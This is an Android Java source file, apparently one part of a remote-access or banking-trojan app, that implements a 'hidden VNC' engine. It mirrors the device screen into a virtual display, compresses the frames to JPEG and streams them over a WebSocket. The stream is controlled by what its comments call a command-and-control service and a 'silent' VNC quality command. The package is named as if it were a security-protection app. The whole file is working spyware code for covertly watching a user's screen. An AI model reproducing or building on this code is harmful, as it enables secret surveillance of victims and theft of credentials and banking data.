package com.seguranca.protecao.hvnc;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.zip.CRC32;

import okhttp3.WebSocket;
import okio.ByteString;

/**
 * HvncEngine — optimised HVNC screen capture pipeline.
 *
 * Pipeline:
 *   ImageReader (RGBA_8888) ← VirtualDisplay (hardware-scaled to captureW×captureH)
 *     → acquireLatestImage  (drop stale — always newest frame)
 *     → AtomicBoolean gate  (drop if encoder still busy with last frame)
 *     → Bitmap wrap         (zero-copy when rowStride == width*4)
 *     → CRC32 dedup         (skip send if screen unchanged, ~0.5ms for 350×650)
 *     → JPEG compress       (Bitmap.compress, configurable quality)
 *     → webSocket.send(ByteString)  ← binary, no base64, no JSON
 *
 * Key improvements over base64-JSON approach:
 *  - 33 % smaller wire payload  (no base64 overhead)
 *  - Zero JSON parse/serialise cost on both ends
 *  - No frame back-log: AtomicBoolean drops frames when encoder is busy
 *  - Hardware screen scaling via VirtualDisplay size (GPU scales, not CPU)
 *  - Unchanged frames never sent (CRC32 check, ~0.5ms per frame)
 *  - Dedicated HandlerThread keeps UI thread and WS thread clean
 */
public class HvncEngine {

    private static final String TAG = "HvncEngine";

    // Target capture width — height is computed from device aspect ratio
    private static final int CAPTURE_W = 360;

    // ── Config (updated live via SET_SILENT_VNC_QUALITY) ─────────────────────
    private final AtomicInteger quality    = new AtomicInteger(50);
    private final AtomicInteger minDelayMs = new AtomicInteger(80); // 80ms ≈ 12 fps

    // ── Pipeline state ────────────────────────────────────────────────────────
    private final AtomicBoolean encoding = new AtomicBoolean(false);
    private volatile boolean    stopped  = false;
    private long                lastCrc  = 0L;     // CRC32 of last sent frame

    // ── Android resources ─────────────────────────────────────────────────────
    private final MediaProjection mediaProjection;
    private final WebSocket       webSocket;
    private final int             screenDpi;
    private final int             captureW;
    private final int             captureH;

    private ImageReader    imageReader;
    private VirtualDisplay virtualDisplay;
    private HandlerThread  handlerThread;
    private Handler        imageHandler;

    // ── Metrics (read by dashboard via periodic event) ────────────────────────
    private volatile int  framesTotal   = 0;
    private volatile int  framesDropped = 0;
    private volatile int  framesSkipped = 0; // dedup skips
    private volatile long lastSentBytes = 0;

    // ── Constructor ───────────────────────────────────────────────────────────
    public HvncEngine(Context ctx, MediaProjection projection, WebSocket ws) {
        this.mediaProjection = projection;
        this.webSocket       = ws;

        WindowManager   wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics  dm = new DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(dm);

        this.screenDpi  = dm.densityDpi;
        this.captureW   = CAPTURE_W;
        // Preserve device aspect ratio — hardware will scale to this
        this.captureH   = (int) (captureW * ((float) dm.heightPixels / dm.widthPixels));

        Log.i(TAG, String.format("init: screen=%dx%d → capture=%dx%d dpi=%d",
                dm.widthPixels, dm.heightPixels, captureW, captureH, screenDpi));
    }

    // ── Public API ────────────────────────────────────────────────────────────

    /**
     * Start the capture loop.
     * Must be called after obtaining MediaProjection permission.
     */
    public void start() {
        if (stopped) return;

        // Dedicated thread for image processing — never touch UI/WS threads
        handlerThread = new HandlerThread("HvncCapture", android.os.Process.THREAD_PRIORITY_DISPLAY);
        handlerThread.start();
        imageHandler = new Handler(handlerThread.getLooper());

        // RGBA_8888 — needed for Bitmap.copyPixelsFromBuffer
        // maxImages=2: one being processed, one buffered — avoids dropped by producer
        imageReader = ImageReader.newInstance(captureW, captureH, PixelFormat.RGBA_8888, 2);
        imageReader.setOnImageAvailableListener(this::onImageAvailable, imageHandler);

        // VirtualDisplay at CAPTURE dimensions — GPU handles scaling to captureW×captureH
        // This is the single biggest perf win: no software scale needed at all
        virtualDisplay = mediaProjection.createVirtualDisplay(
                "HVNC",
                captureW, captureH, screenDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null, null
        );

        Log.i(TAG, "HVNC started — capture " + captureW + "×" + captureH
                + " Q" + quality.get() + " interval=" + minDelayMs.get() + "ms");
    }

    /**
     * Update JPEG quality (10–85) and recompute frame pacing.
     * Called live from CommandControlService when SET_SILENT_VNC_QUALITY arrives.
     */
    public void setQuality(int q) {
        q = Math.max(10, Math.min(85, q));
        quality.set(q);

        // Lower quality → smaller frames → can afford faster FPS
        // Higher quality → larger frames → slow down to avoid congestion
        if      (q <= 20) minDelayMs.set(50);   // ~20 fps, tiny frames
        else if (q <= 35) minDelayMs.set(66);   // ~15 fps
        else if (q <= 55) minDelayMs.set(80);   // ~12 fps
        else if (q <= 70) minDelayMs.set(100);  // ~10 fps
        else              minDelayMs.set(150);  // ~7 fps, large frames

        Log.d(TAG, "quality=" + q + " → interval=" + minDelayMs.get() + "ms");
    }

    /** Stop cleanly — release all resources. */
    public void stop() {
        stopped = true;
        if (virtualDisplay  != null) { virtualDisplay.release();  virtualDisplay  = null; }
        if (imageReader     != null) { imageReader.close();       imageReader     = null; }
        if (mediaProjection != null) { mediaProjection.stop(); }
        if (handlerThread   != null) { handlerThread.quitSafely(); handlerThread  = null; }
        Log.i(TAG, String.format("HVNC stopped — sent=%d dropped=%d skipped=%d",
                framesTotal, framesDropped, framesSkipped));
    }

    public int getCaptureWidth()  { return captureW; }
    public int getCaptureHeight() { return captureH; }

    // ── Image available callback (runs on HandlerThread) ──────────────────────

    private long lastFrameTs = 0;

    private void onImageAvailable(ImageReader reader) {
        if (stopped) return;

        // Frame pacing: enforce minimum interval between frames
        long now = System.currentTimeMillis();
        if (now - lastFrameTs < minDelayMs.get()) {
            try (Image img = reader.acquireLatestImage()) { /* drain */ }
            return;
        }

        // Drop frame if encoder is still busy (non-blocking check)
        if (!encoding.compareAndSet(false, true)) {
            try (Image img = reader.acquireLatestImage()) { /* drain to prevent OOM */ }
            framesDropped++;
            return;
        }

        Image image = null;
        try {
            // acquireLatestImage — discards all but the newest frame
            image = reader.acquireLatestImage();
            if (image == null) { encoding.set(false); return; }

            lastFrameTs = now;
            processFrame(image);

        } catch (Exception e) {
            Log.w(TAG, "Frame processing error: " + e.getMessage());
            encoding.set(false);
        } finally {
            if (image != null) {
                try { image.close(); } catch (Exception ignored) {}
            }
        }
    }

    // ── Core frame processing ─────────────────────────────────────────────────

    private void processFrame(Image image) {
        final Image.Plane plane    = image.getPlanes()[0];
        final ByteBuffer  buf      = plane.getBuffer().duplicate();
        final int         rowStride = plane.getRowStride();
        final int         pixStride = plane.getPixelStride();
        final int         w         = image.getWidth();
        final int         h         = image.getHeight();

        // ── 1. Bitmap construction (prefer zero-copy path) ────────────────────
        final Bitmap bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);

        if (rowStride == w * pixStride) {
            // Ideal case: no row padding — copy buffer directly
            bmp.copyPixelsFromBuffer(buf);
        } else {
            // Device has row stride padding — extract only valid pixels per row
            byte[] row = new byte[w * pixStride];
            byte[] all = new byte[w * h * 4];
            buf.rewind();
            int dst = 0;
            for (int y = 0; y < h; y++) {
                buf.position(y * rowStride);
                buf.get(row, 0, row.length);
                System.arraycopy(row, 0, all, dst, row.length);
                dst += row.length;
            }
            bmp.copyPixelsFromBuffer(ByteBuffer.wrap(all));
        }

        // ── 2. CRC32 deduplication ────────────────────────────────────────────
        // Allocate once per frame — 350×650×4 ≈ 910 KB
        ByteBuffer pixBuf = ByteBuffer.allocate(w * h * 4);
        bmp.copyPixelsToBuffer(pixBuf);
        CRC32 crc32 = new CRC32();
        crc32.update(pixBuf.array());
        long crc = crc32.getValue();

        if (crc == lastCrc) {
            // Screen unchanged — skip transmission
            bmp.recycle();
            framesSkipped++;
            encoding.set(false);
            return;
        }
        lastCrc = crc;

        // ── 3. JPEG compression ───────────────────────────────────────────────
        // Initial capacity = rough estimate to avoid realloc
        ByteArrayOutputStream bos = new ByteArrayOutputStream(w * h / 6);
        bmp.compress(Bitmap.CompressFormat.JPEG, quality.get(), bos);
        bmp.recycle();

        final byte[] jpeg = bos.toByteArray();
        lastSentBytes = jpeg.length;

        // ── 4. Binary WebSocket send — zero overhead ───────────────────────────
        // ByteString.of() copies the array once — that's unavoidable.
        // No base64, no JSON wrap, no string allocation.
        if (!stopped && webSocket != null) {
            boolean sent = webSocket.send(ByteString.of(jpeg));
            if (sent) framesTotal++;
            else      framesDropped++; // WS send queue full
        }

        encoding.set(false);
    }
}
